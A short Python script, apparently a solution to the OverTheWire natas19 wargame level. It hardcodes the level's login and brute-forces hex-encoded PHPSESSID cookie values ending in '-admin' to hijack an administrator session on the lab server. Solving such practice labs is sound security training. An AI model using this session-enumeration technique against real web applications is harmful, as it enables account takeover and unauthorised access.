import requests

url = 'http://natas19.natas.labs.overthewire.org/index.php'
username = "natas19"
password = "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s"

for c in range(1,641): 
    if len(str(c)) == 1:
        cookies = {"PHPSESSID":"3{}2d61646d696e".format(c)}
    elif len(str(c)) == 2:
        cookies = {"PHPSESSID":"3{}3{}2d61646d696e".format(str(c)[0],str(c)[1])}
    elif len(str(c)) == 3:
        cookies = {"PHPSESSID":"3{}3{}3{}2d61646d696e".format(str(c)[0],str(c)[1],str(c)[2])}
    response = requests.get(url=url,auth=(username,password),cookies=cookies)
    print(f"{c} of 640.")
    if len(response.text) > 1029:
        print((response.text))
        break